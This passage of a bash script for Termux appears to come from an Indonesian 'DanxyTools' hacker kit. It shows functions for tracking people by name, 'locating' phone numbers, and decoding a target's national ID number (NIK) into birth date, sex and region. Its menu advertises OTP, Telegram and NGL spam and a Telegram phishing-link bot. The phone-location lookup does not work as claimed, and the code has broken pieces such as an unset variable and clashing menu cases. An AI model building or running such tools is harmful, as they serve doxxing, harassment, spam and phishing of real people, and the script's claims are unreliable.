⢠⣾⣿⣻⣧⣻⣆⠘⣿⣿⣿⠿⠿⠛⠛⠛⠻⠾⠇⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣿⣿⣿⣿⣿⣿⢟⡹⣸⡇⠀⠀⠀⠀
⢨⣿⣟⣿⡿⣧⡘⣷⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣥⣮⣵⣼⣁⣀⣀⣀⣀
⢘⣿⣿⣻⣟⣿⣻⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣼⣿⣿⠋⠉⠉⠉⠙⠛⠛⠿⣯⣉⠉⣙⣻⠽⠛⣿
⠈⠻⠟⡭⠯⠏⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⠘⠷⢦⣄⣀⣀⣤⣤⣾⣿⣿⣿⣏⣀⣀⣀⣀⣀⣀⣠⠤⠤⠬⠟⠛⠋⠁⢀⣤⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣀⣠⣾⠟⠙
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣷⡟⠉⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⢠⣦⣤⣶⡶⢟⡟⣋⠳⣼⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣿⣿⣿⣿⠿⣛⡙⢦⠚⡥⢓⡞⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣽⣯⣯⣽⣿⣎⠳⡌⡵⢊⡵⣌⡟⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢿⣿⣿⣯⢿⣮⣑⠳⣌⣣⠶⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠈⠓⠛⠛⠛⠛⠉⠀" | lolcat
echo -e "${CYAN}
  ╭────────────────────────────────────────╮
  │             ${YELLOW}${BOLD}LACAK NAMA${CYAN}                 │
  ╰────────────────────────────────────────╯${NC}"
read -p "Masukkan nama lengkap: " nama

echo ""
echo -e "\033[1;94m[↓] Sedang mencari data publik tentang: $nama...\033[0m"
sleep 2

# Simulasi pencarian melalui Google Dork / GitHub / Social media
echo ""
echo -e "\033[1;93m[∆] Hasil pencarian publik:\033[0m"

# Gunakan dork Google Search (hasil hanya tampil di terminal)
echo -e "\n🔗 Google Search:"
echo "https://www.google.com/search?q=\"$nama\" site:facebook.com"
echo "https://www.google.com/search?q=\"$nama\" site:linkedin.com"
echo "https://www.google.com/search?q=\"$nama\" site:twitter.com"

# Dork GitHub
echo -e "\n🔗 GitHub (mungkin jika target programmer):"
echo "https://github.com/search?q=$nama"
curl -s "https://api.github.com/users/$user" | jq -r '.html_url'
curl -s "https://www.instagram.com/$user" | head -1
# Tambahan sumber publik (jika diperlukan)
echo -e "\n🔗 Sumber tambahan:"
echo "https://www.peekyou.com/$nama"
echo "https://pipl.com/search/?q=$nama"

echo ""
echo -e "\033[1;92m[✓] Selesai. Silakan salin dan telusuri link di atas.\033[0m"
}

lacak_lokasi_nomor() {
clear
    echo -e "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀                  ⠀⣠⣶⡿⠟⠛⠛⠻⢿⣷⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡿⠋⠀⠀⠀⠀⠀⠀⠉⢻⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⠀⠀⣤⣖⣿⣿⣿⣿⣒⡦⡀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧⣴⣾⣿⡛⣿⣿⣿⣿⠛⣻⣷⣶⣄⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠿⠿⠛⠋⠙⠛⠿⠿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣷⡿⣿⣷⣄⡀⠀⣀⣴⣿⢟⣽⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠏⠙⠿⣿⣿⣌⠻⢿⣿⣿⡿⠟⣩⣾⣿⡿⠛⠙⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠀⠀⠀⠀⠀⠙⠛⠳⠄⠀⠀⠀⠴⠛⠋⠁⠀⠀⠀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠁⢠⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣄⠀⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠏⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠘⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣟⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣦⣀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡅⢀⣿⣿⣿⣿⣿⣿⣿⣿⡇⣀⣤⣾⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠉⠀
                        [${BG_RED}${YELLOW}Hellow My Name is Danxy${NC}]
" | lolcat
    echo -n "Masukkan nomor HP (dengan kode negara, contoh 08xxx): "
    read nomor

    echo "[🔍] Mengecek lokasi..."
    curl -s "http://ip-api.com/json/$(curl -s https://numlookupapi.com/api/lookup/$nomor | grep -oP '(?<="ip":")[^"]+')" | jq
}



osint_nik() {
    clear
    echo -e "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀                  ⠀⣠⣶⡿⠟⠛⠛⠻⢿⣷⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡿⠋⠀⠀⠀⠀⠀⠀⠉⢻⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⠀⠀⣤⣖⣿⣿⣿⣿⣒⡦⡀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧⣴⣾⣿⡛⣿⣿⣿⣿⠛⣻⣷⣶⣄⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠿⠿⠛⠋⠙⠛⠿⠿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣷⡿⣿⣷⣄⡀⠀⣀⣴⣿⢟⣽⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠏⠙⠿⣿⣿⣌⠻⢿⣿⣿⡿⠟⣩⣾⣿⡿⠛⠙⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠀⠀⠀⠀⠀⠙⠛⠳⠄⠀⠀⠀⠴⠛⠋⠁⠀⠀⠀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠁⢠⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣄⠀⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠏⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠘⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣟⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣦⣀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡅⢀⣿⣿⣿⣿⣿⣿⣿⣿⡇⣀⣤⣾⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠉⠀
                        [${BG_RED}${YELLOW}Hellow My Name is Danxy${NC}]
" | lolcat
    echo -e "${BG_RED}${YELLOW}CHECKER INFORMASI NIK${NC}"

    # Input NIK
    read -p "$(echo -e ${RED}Input\ NIK\ Target:\ ${NC})" nik

    # Validasi NIK
    if ! [[ $nik =~ ^[0-9]{16}$ ]]; then
        echo -e "${RED}ERROR! NIK Tidak Valid!${NC}"
        exit 1
    fi

    # Jalankan loading pura-pura (misalnya 3 detik) di background
    (sleep 3) &
    pid=$!
    spin $pid
    wait $pid

    # Ekstrak data
    tanggal="${nik:6:2}"
    bulan="${nik:8:2}"
    tahun="${nik:10:2}"
    prov="${nik:0:2}"
    kabkot="${nik:0:4}"
    kecamatan="${nik:0:6}"
    uniqcode="${nik:12:4}"

    # Jenis kelamin
    if ((10#$tanggal > 40)); then
        tanggal=$((10#$tanggal - 40))
        jeniskelamin="PEREMPUAN"
    else
        jeniskelamin="LAKI-LAKI"
    fi

    # Cek data.json
    if [[ ! -f "data.json" ]]; then
        echo -e "${RED}! Data Tidak Valid !${NC}"
        exit 1
    fi

    # Ambil data dari JSON
    provinsi=$(jq -r --arg p "$prov" '.provinsi[$p] // $p' data.json)
    kabupaten=$(jq -r --arg k "$kabkot" '.kabkot[$k] // $k' data.json)
    kecamatan_data=$(jq -r --arg kc "$kecamatan" '.kecamatan[$kc] // $kc' data.json)

    # Pecah kecamatan & kode pos
    if [[ "$kecamatan_data" == *"--"* ]]; then
        kecamatan_name="${kecamatan_data%%--*}"
        kode_pos="${kecamatan_data##*--}"
    else
        kecamatan_name="$kecamatan_data"
        kode_pos="N/A"
    fi

    # Output
    loading
    echo -e "${GREEN}!Tanggal Lahir: $tanggal/$bulan/$tahun${NC}"
    echo -e "${GREEN}!Jenis Kelamin: $jeniskelamin${NC}"
    echo -e "${GREEN}!Provinsi: $provinsi${NC}"
    echo -e "${GREEN}!Kab/Kota: $kabupaten${NC}"
    echo -e "${GREEN}!Kecamatan: $kecamatan_name${NC}"
    echo -e "${GREEN}!Kode Pos: $kode_pos${NC}"
    echo -e "${GREEN}!Uniqcode: $uniqcode${NC}"
}

menu_Osin() {
  while true; do
clear
  if command_exists figlet; then
    figlet -f slant " MenuOsin" | lolcat
  else
    echo -e "${CYAN}  ===== DanxyTols =====${NC}"
    sleep 1
    clear
  fi
     echo -e "  ${BG_RED}${YELLOW}MENU KE 2 DANXY TOOLS${NC}"
     echo -e "
 ╭───────────────────────────────────────────────╮
 │                                               │
 ╭─────────────┬────────────────────────────┬────╮
 │  [   01   ] │ SHORT LINK                 │    │
 │  [   02   ] │ Chat Ai                    │    │
 │  [   03   ] │ Checker NIK                │    │
 │  [   04   ] │ Spam Tele                  │    │
 │  [   05   ] │ Tracking Nama              │    │
 │  [   06   ] │ Checker BD File PHP        │    │
 │  [   07   ] │ Spam NGL                   │    │
 │  [   08   ] │ Spam Otp  (WA)             │    │
 │  [   09   ] │ Generate Pasword           │    │
 │  [   10   ] │ Phising Link (Bot telegram)│    │ 
 │  [   11   ] │ Checker Cyrpto BTC/USDT    │    │     
 │  [   00   ] │ KEMBALI KE MENU AWAL       │    │
 ╰─────────────┴────────────────────────────┴────╯
 │                                               │
 ╰───────────────────────────────────────────────╯" | lolcat
   echo -e "${GREEN}● ${YELLOW}● ${RED}●"
   echo -e "${WHITE}DEVELOPER: ${BG_GREEN}${RED}DANXY OFFICIAL✓${NC}"
    printf "${GREEN}┏━[ ${RED}DANXY TOOLS V8.3${NC} ${GREEN}]${YELLOW}@termux${RED} ~ ${NC}${RED}[${YELLOW} OSIN ${YELLOW}${RED}]${NC}${GREEN}\n┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
        read -r pilih

    case $pilih in
    
      01|1)
      klik
        short_url
        klik
       ;;
      02|2)
      klik
        ai_chat
        klik
       ;;
      03|4)
      klik
        cheker_nik
        klik
       ;;
      04|4)
      klik
        spam_tg
        kembali_ke_menu
        klik 
       ;;
       05|5)
       klik
        track_nama
        klik
        ;;
       06|6)
       klik
        checker_backdor_php
        klik
        ;;
       07|7)
       klik
        ngl_spam
        klik
        ;;
       08|8)
       klik
        spam_otp
        kembali_ke_termux
        klik
        ;;
       09|9)
       klik
        generate_password
        klik
        ;;
      10)
      klik
        phising_tele
        klik
        ;;
       11)
       klik
        crypto_check
        klik
        ;;
      00|0)
      klik
        echo "CLOSE MENU 2" | lolcat
        break
        ;;
        *)
        echo "INPUT TIDAK VALID!" | lolcat
        salah
        ;;
    esac

     echo ""
    read -p "ENTER UNTUK KEMBALI KE MENU" | lolcat
    klik
  done
}



########################################################################

crypto_check() {
  curl -s "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum&vs_currencies=usd" | jq .
  read -p "Tekan Enter untuk kembali..."
}

spin() {
    local pid=$1
    local delay=0.25
    echo -e "${GREEN}"
    local spinner=( '█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█' )

    while kill -0 "$pid" 2>/dev/null; do
        for frame in "${spinner[@]}"; do
            printf "\r[%s] Sedang memproses..." "$frame"
            sleep "$delay"
        done
    done
    printf "\r[✓] Selesai!                  \n"
}

ai_chat() {
    clear
    echo "CARA KELUAR DARI AI CHAT: ketik Q lalu ENTER"
    echo
    echo "DanxyToolsV8.3 AI Chat"
    echo

    while true; do
        echo -n "Pertanyaan Kamu: "
        read -r pertanyaan

        case "$pertanyaan" in
            [qQ])
                echo
                echo "Keluar dari chat..."
                sleep 1
                kembali_ke_menu
                return
                ;;
            "")
                echo -e "${RED}[!] Pertanyaan tidak boleh kosong${NC}"
                echo
                continue
                ;;
        esac

        # --- tangkap pertanyaan tentang nama ---
        if [[ "${pertanyaan,,}" =~ (siapa nama|namamu siapa|who are you) ]]; then
            echo -e "${YELLOW}Kamu:${NC} $pertanyaan"
            echo -e "${CYAN}DanxyToolsV8.3:${NC} nama saya DanxyTools siap membantu kamu"
            echo
            continue
        fi

        # encode query
        q_enc=$(printf '%s' "$pertanyaan" | jq -sRr @uri)

        # --- retry 3 kali bila server 5xx ---
        for attempt in {1..3}; do
            temp_file=$(mktemp)
            http_code=$(curl -s -w "%{http_code}" -o "$temp_file" \
                        "https://api.fikmydomainsz.xyz/ai/nowchat?q=$q_enc" 2>/dev/null)

            if [[ "$http_code" -eq 200 ]]; then
                jawaban=$(jq -r '.jawaban // .answer // "Maaf, tidak ada jawaban."' "$temp_file" 2>/dev/null)
                rm -f "$temp_file"
                [[ -z "$jawaban" ]] && jawaban="Maaf, tidak ada jawaban."

                echo -e "${YELLOW}Kamu:${NC} $pertanyaan"
                echo -e "${CYAN}DanxyToolsV8.3:${NC} $jawaban"
                echo
                break
            else
                rm -f "$temp_file"
                if [[ $attempt -lt 3 ]]; then
                    echo -e "${YELLOW}[...] Server sibuk (HTTP $http_code), coba lagi... ($attempt/3)${NC}"
                    sleep 2
                else
                    echo -e "${RED}[!] Server tidak dapat dijangkau (HTTP $http_code).${NC}"
                    echo -e "${RED}    Silakan coba beberapa saat lagi atau ketik 'q' untuk kembali.${NC}"
                    echo
                fi
            fi
        done
    done
}




short_url() {
    echo "Masukkan URL yang ingin dipendekkan: "
    read url
    if [[ -z "$url" ]]; then
        echo "[!] URL tidak boleh kosong"
        return
    fi

    temp_file=$(mktemp)
    curl -s "https://tinyurl.com/api-create.php?url=$url" > "$temp_file" &
    pid=$!
    spin $pid
    wait $pid

    short=$(cat "$temp_file")
    rm "$temp_file"

    if [[ -z "$short" ]]; then
        echo "[!] Gagal memendekkan URL"
    else
        echo "URL Asli    : $url"
        echo "URL Pendek  : $short"
    fi
}

spin() {
    local pid=$1
    local delay=0.25
    echo -e "${GREEN}"
    local spinner=( '█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█' )

    while kill -0 "$pid" 2>/dev/null; do
        for frame in "${spinner[@]}"; do
            printf "\r[%s] Sedang memproses..." "$frame"
            sleep "$delay"
        done
    done
    printf "\r[✓] Selesai!                  \n"
}

cheker_nik() {
    clear
    echo -e "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀                  ⠀⣠⣶⡿⠟⠛⠛⠻⢿⣷⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡿⠋⠀⠀⠀⠀⠀⠀⠉⢻⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⠀⠀⣤⣖⣿⣿⣿⣿⣒⡦⡀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧⣴⣾⣿⡛⣿⣿⣿⣿⠛⣻⣷⣶⣄⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠿⠿⠛⠋⠙⠛⠿⠿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣷⡿⣿⣷⣄⡀⠀⣀⣴⣿⢟⣽⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠏⠙⠿⣿⣿⣌⠻⢿⣿⣿⡿⠟⣩⣾⣿⡿⠛⠙⢿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠀⠀⠀⠀⠀⠙⠛⠳⠄⠀⠀⠀⠴⠛⠋⠁⠀⠀⠀⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠁⢠⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣄⠀⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠏⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠘⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣟⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢹⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣦⣀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡅⢀⣿⣿⣿⣿⣿⣿⣿⣿⡇⣀⣤⣾⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠉⠀
                        [${BG_RED}${YELLOW}Hellow My Name is Danxy${NC}]
" | lolcat
    echo -e "${BG_RED}${YELLOW}CHECKER INFORMASI NIK${NC}"

    # Input NIK
    read -p "$(echo -e ${RED}Input\ NIK\ Target:\ ${NC})" nik

    # Validasi NIK
    if ! [[ $nik =~ ^[0-9]{16}$ ]]; then
        echo -e "${RED}ERROR! NIK Tidak Valid!${NC}"
        exit 1
    fi

